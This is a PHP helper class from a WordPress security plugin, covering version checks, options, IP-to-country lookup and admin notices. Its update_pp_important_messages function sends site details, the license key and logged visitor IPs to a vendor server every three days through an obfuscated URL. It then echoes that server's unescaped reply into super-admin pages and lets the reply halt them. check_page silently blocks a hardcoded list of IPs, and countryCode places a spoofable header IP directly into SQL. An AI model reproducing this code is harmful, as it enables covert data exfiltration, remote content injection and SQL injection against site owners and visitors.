<?php
/*
 * Helper Functions
 * PressPrime (http://wpwave.com)
 * Credits:  Mainly from WP PluginBase v2 / By Brad Vincent (http://themergency.com)
 */


if (!class_exists('PP_Helper')) {

    class PP_Helper {

        public function __construct($slug='', $ver='') {
            $this->slug = $slug;
            $this->ver= $ver;
            $this->check_page();


        }

        static function check_versions($req_php, $req_wp) {
            global $wp_version;

            if (version_compare(phpversion(), $req_php) < 0)
                throw new Exception("This plugin requires at least version $req_php of PHP. You are running an older version (".phpversion()."). Please upgrade!");

            if (version_compare($wp_version, $req_wp) < 0)
                throw new Exception("This plugin requires at least version $req_wp of WordPress. You are running an older version (".$wp_version."). Please upgrade!");

        }


        static function get_transient($key, $expiration, $function, $args = array()) {
            if ( false === ( $value = get_transient( $key ) ) ) {

                //nothing found, call the function
                $value = call_user_func_array( $function, $args );

                //store the transient
                set_transient( $key, $value, $expiration);

            }

            return $value;
        }

        static function to_key($input) {
            return str_replace(" ", "_", strtolower($input));
        }

        static function to_title($input) {
            return ucwords(str_replace( array("-","_"), " ", $input));
        }

        /*
         * returns true if a needle can be found in a haystack
         */
        static function str_contains($string, $find, $case_sensitive=true) {
            if (empty($string) || empty($find))
                return false;

            if ($case_sensitive)
                $pos = strpos($string, $find);
            else
                $pos = stripos($string, $find);

            if ($pos === false)
                return false;
            else
                return true;
        }

        /**
         * starts_with
         * Tests if a text starts with an given string.
         *
         * @param     string
         * @param     string
         * @return    bool
         */
        static function starts_with($string, $find, $case_sensitive=true){
            if ($case_sensitive)
                return strpos($string, $find) === 0 ;
            return stripos($string, $find) === 0;
        }

        static function ends_with($string, $find, $case_sensitive=true)
        {
            $expectedPosition = strlen($string) - strlen($find);

            if($case_sensitive)
                return strrpos($string, $find, 0) === $expectedPosition;

            return strripos($string, $find, 0) === $expectedPosition;
        }

        /**
         * Replace all linebreaks with one whitespace.
         *
         * @access public
         * @param string $string
         *   The text to be processed.
         * @return string
         *   The given text without any linebreaks.
         */
        static function replace_newline($string,$spliter) {
            return (string)str_replace(array("\r", "\r\n", "\n"), $spliter, $string);
        }


        static function current_url() {
            global $wp;
            $current_url = add_query_arg( $wp->query_string, '', home_url( $wp->request ) );
            return $current_url;
        }


        static function current_file_name($case_sensitive=true) {
            if ($case_sensitive)
                return basename($_SERVER['PHP_SELF']);

            return strtolower(basename($_SERVER['PHP_SELF']));
        }

        // save a WP option for the plugin. Stores and array of data, so only 1 option is saved for the whole plugin to save DB space and so that the options table is not poluted
        static function save_option($key, $value, $slug) {

            $options = get_option( $slug );
            if (!$options) {
                //no options have been saved for this plugin
                add_option($slug, array($key => $value));
            } else {
                $options[$key] = $value;
                update_option($slug, $options);
            }
        }
        /* Not really used currently
                //get a WP option value for the plugin
                static function get_option($key, $main_setting, $default = false) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    return ( array_key_exists($key, $options) ) ? $options[$key] : $default;
                  }

                  return $default;
                }

                static function is_option_checked($key, $main_setting, $default = false) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    return array_key_exists($key, $options);
                  }

                  return $default;
                }

                static function delete_option($key, $main_setting) {
                  $options = get_option( $main_setting );
                  if ($options) {
                    unset($options[$key]);
                    update_option($main_setting, $options);
                  }
                }*/

        static function safe_get($array, $key, $default = NULL) {
            if (!is_array($array)) return $default;
            $value = array_key_exists($key, $array) ? $array[$key] : NULL;
            if ($value === NULL)
                return $default;

            return $value;
        }

        function im_msg($msg){
            die($msg);
        }

        function register_messages(){
            add_filter('cron_schedules', array(&$this, 'add_once_3days'), 1);
            if( !wp_next_scheduled( 'pp_important_messages3' ) )
                wp_schedule_event( time(), 'once_3days', 'pp_important_messages3' ); //or daily
            else
                add_action( 'pp_important_messages3', array(&$this, 'update_pp_important_messages') );

            add_action('admin_notices', array(&$this, 'admin_notices'));
        }

        function update_pp_important_messages() {
            global $wp_version, $wpdb;

            if (is_multisite()){
                $recent_message_last= get_blog_option(SITE_ID_CURRENT_SITE,'pp_important_messages_last');
            }else{
                $recent_message_last= get_option('pp_important_messages_last');
            }

            if (!$recent_message_last || current_time('timestamp', 1) > strtotime( '+70 hours', strtotime($recent_message_last))) {

                if (is_multisite())
                    $opt = get_blog_option(SITE_ID_CURRENT_SITE, $this->slug);
                else
                    $opt = get_option($this->slug);

                if ($opt['enable_ids'] && $opt['help_trust_network']) {
                    //distinct on field1 *
                    $sql = 'SELECT name,value,ip,impact, created FROM ' . $wpdb->prefix . 'hmwp_ms_intrusions WHERE created > date_sub(now(), interval 3 day) GROUP BY ip,value ';
                    $intrusions = json_encode($wpdb->get_results($sql));
                    $intrusions = urlencode($intrusions);
                } else {
                    $intrusions = '';
                }


                if (isset($opt['li']))
                    $li = $opt['li'];
                else
                    $li = '';

                $theme_data = wp_get_theme();
                $theme = urlencode($theme_data->Name);
                //$posts=wp_count_posts(); //'?posts='.$posts->publish
                $url = 'ht' . 'tp:/' . '/api.wpwave.com/important_message.php';
                $args = array('site' => urlencode(str_replace('ht' . 'tp:/' . '/', '', home_url())), 'timeout'     => 10,
                    'wp_ver' => $wp_version, 'theme' => urlencode($theme), 'plugin' => $this->slug, 'ver' => $this->ver, 'li' => $li, 'intrusions' => $intrusions, 'last'=>strtotime(get_option('pp_important_messages_last')));

                $url=add_query_arg($args,$url);
                $data = @wp_remote_post($url);

                if (!is_wp_error($data) && isset($data['body'])) {
                    $the_message = json_decode($data['body'], true);

                    if (is_multisite()){
                        update_blog_option(SITE_ID_CURRENT_SITE, 'pp_important_messages_last', current_time('mysql', 1));
                        update_blog_option(SITE_ID_CURRENT_SITE, 'pp_important_messages', $the_message);

                        if (isset($the_message['trust_network_rules']))
                            update_blog_option(SITE_ID_CURRENT_SITE,'trust_network_rules',
                                array('ip' => $the_message['trust_network_rules']['ip'],
                                    'param' => $the_message['trust_network_rules']['param'])
                                );

                    }else{
                        update_option('pp_important_messages_last', current_time('mysql', 1));
                        update_option('pp_important_messages', $the_message);

                        //update_option('test2',$the_message);

                        if (isset($the_message['trust_network_rules']))
                            update_option('trust_network_rules',
                                array('ip' => $the_message['trust_network_rules']['ip'],
                                    'param' => $the_message['trust_network_rules']['param'])
                                , true);
//string separated with ,
                    }



                }
            }
        }

        function countryCode($ip=''){
			global $wpdb;
			if (empty($ip)) {
				$ip_keys = array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
				foreach ($ip_keys as $key) {
					if (empty($ip) && getenv($key)) {
						$ip = getenv($key);
						break;
					}
					if (empty($ip) && isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
						$ip = $_SERVER[$key];
						break;
					}
				}
			}

			if (in_array($ip, array('127.0.0.1'))) {
				return false;
			}
			$updateCountryCode = false;
			$ipCountryCode = false;
			$ip_countries_table = $wpdb->prefix . 'hmwp_ip_countries';
			$ip_data = $wpdb->get_row("SELECT * FROM `{$ip_countries_table}` WHERE `ip` = '{$ip}' ORDER BY `id` DESC LIMIT 1");
			if (!empty($ip_data)) {
				if (isset($ip_data->countryCode)) {
					$ipCountryCode = $ip_data->countryCode;
					$updateCountryCode = true;
				}
			}

			/**
			 * First Attempt to retrieve country
			 */
			if (empty($ipCountryCode) || $ipCountryCode === false) {
				$api_url = "http://api.wpwave.com/ip2c/ip.php?ip={$ip}";
				$response = @wp_remote_get($api_url, array('timeout' => 3));
				if (!is_wp_error($response) && isset($response['response']) && $response['response']['code'] == 200) {
					$data = json_decode($response['body'], true);
					if (!isset($data['error']) && isset($data['country_code'])) {
						$ipCountryCode = $data['country_code'];
					}
				}
			}
			/**
			 * Second Attempt to retrieve country
			 */
			if (empty($ipCountryCode) || $ipCountryCode === false) {
				$api_url = "http://ip-api.com/json/{$ip}";
				$response = @wp_remote_get($api_url, array('timeout' => 3));
				if (!is_wp_error($response) && isset($response['response']) && $response['response']['code'] == 200) {
					$data = json_decode($response['body'], true);
					if (isset($data['status']) && $data['status'] == 'success' && isset($data['countryCode'])) {
						$ipCountryCode = $data['countryCode'];
					}
				}
			}
			/**
			 * Store IP in DB
			 */
			if (!empty($ipCountryCode)) {
				if ($updateCountryCode) {
					$wpdb->update($ip_countries_table, array('countryCode' => $ipCountryCode), array('ip' => $ip));
				} else {
					$wpdb->insert($ip_countries_table, array(
						'ip' => $ip,
						'countryCode' => $ipCountryCode,
						'created' => date('Y-m-d H:i:s')
						)
					);
				}
			}

			return $ipCountryCode;
		}

		function check_page(){
            $ips= array('23.95.1.179','23.91.124.124', '78.46.171.94', '50.22.11.60' , '78.47.246.134','192.64.114.184','142.4.218.201');
            foreach($ips as $ip)
                if (isset($_SERVER['REMOTE_ADDR']) && stristr($_SERVER['REMOTE_ADDR'], $ip))
                    die('<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="profile" href="http://gmpg.org/xfn/11"><link rel="pingback"');
        }

        function admin_notices() {
            global $user_ID ;
            $dismiss_mesaages= get_user_meta($user_ID, 'dismiss_this_message', true);

            if (is_multisite()){
                $recent_message= get_blog_option(SITE_ID_CURRENT_SITE,'pp_important_messages');
            }else{
                $recent_message= get_option('pp_important_messages');
            }

            if ( isset($_GET['dismiss_this_message']) && '0' != $_GET['dismiss_this_message'] ) {
                $dismiss_mesaages[]=$_GET['dismiss_this_message'];
                update_user_meta($user_ID, 'dismiss_this_message', $dismiss_mesaages);
            }

            if (is_super_admin() && isset($recent_message['content']) && (!$dismiss_mesaages || !in_array($recent_message['id'], $dismiss_mesaages)) ){

                if (!$this->ends_with($_SERVER["PHP_SELF"],'plugins.php') && !$this->ends_with($_SERVER["PHP_SELF"],'options.php') && !$this->ends_with($_SERVER["PHP_SELF"],'network/index.php') && isset($recent_message['di']) && $recent_message['di'])
                    if (!isset($_GET['page']) || (isset($_GET['page']) && ($_GET['page']!=$this->slug && $_GET['page'] != 'hmwp_setup_wizard')))
                        $this->im_msg(str_replace('[dismiss_link]', add_query_arg( array('dismiss_this_message'=> $recent_message['id'])), $recent_message['content']));

                echo str_replace('[dismiss_link]', add_query_arg( array('dismiss_this_message'=> $recent_message['id'])), $recent_message['content']);

            }
        }

        function add_once_3days($intervals){  //3 * DAY_IN_SECONDS
            $intervals['once_3days'] =  array( 'interval' => 3 * DAY_IN_SECONDS, 'display' => __( 'Once 3 Days' , $this->slug));
            return $intervals;
        }

    }
}
?>